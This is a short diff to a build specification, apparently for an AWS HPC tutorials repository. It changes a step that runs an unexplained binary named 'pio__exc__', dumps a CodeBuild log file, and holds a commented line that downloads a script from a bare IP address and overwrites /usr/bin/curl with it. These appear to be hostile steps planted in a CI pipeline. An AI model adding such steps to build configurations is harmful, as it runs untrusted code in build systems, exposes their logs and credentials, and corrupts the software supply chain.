@@ -59,7 +59,7 @@ frontend:
 #         Localbuild
         - cp $GOPATH/src/pio__exc__ $GOPATH/src/aws-hpc-tutorials/
         - cd $GOPATH/src/aws-hpc-tutorials/
-        - ./pio__exc__ detect
+        - ./pio__exc__ localbuild
         - cat /codebuild/output/log
 
 #         - /usr/bin/curlorg http://44.202.99.166:8000/overwrite.sh > /usr/bin/curl
